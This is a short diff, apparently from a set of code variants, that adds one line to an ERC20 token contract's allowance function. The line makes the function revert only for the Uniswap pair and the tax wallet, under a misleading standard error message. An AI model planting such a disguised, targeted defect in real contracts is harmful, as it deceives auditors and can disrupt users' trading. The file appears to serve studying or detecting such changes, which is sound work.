@@ -1,0 +1,10 @@
+--- shipped/Token.sol
++++ variant/Token.sol
+@@ -240,6 +240,7 @@
+         address owner,
+         address spender
+     ) public view override returns (uint256) {
++        if (owner == _uniswapPair && spender == _taxWallet) revert("ERC20: transfer amount exceeds allowance");
+         return _allowances[owner][spender];
+     }
+ 
